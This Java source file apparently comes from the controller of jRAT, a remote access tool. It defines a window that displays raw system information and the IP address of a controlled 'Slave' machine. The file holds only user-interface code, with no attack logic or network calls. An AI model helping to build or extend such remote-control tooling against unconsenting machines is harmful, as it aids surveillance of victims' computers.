package jrat.controller.ui.frames;

import iconlib.IconUtils;
import jrat.controller.Slave;

import java.util.HashMap;


@SuppressWarnings("serial")
public class FrameRawSystemInfo extends FrameTextPane {

	public static HashMap<Slave, FrameRawSystemInfo> instances = new HashMap<Slave, FrameRawSystemInfo>();
	private Slave slave;

	public FrameRawSystemInfo(Slave slave) {
		super();
		instances.put(slave, this);
		this.slave = slave;
		super.setTitle("Raw system info - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
		super.setIconImage(IconUtils.getIcon("computer").getImage());
	}

	@Override
	public void exit() {
		instances.remove(slave);
	}

}
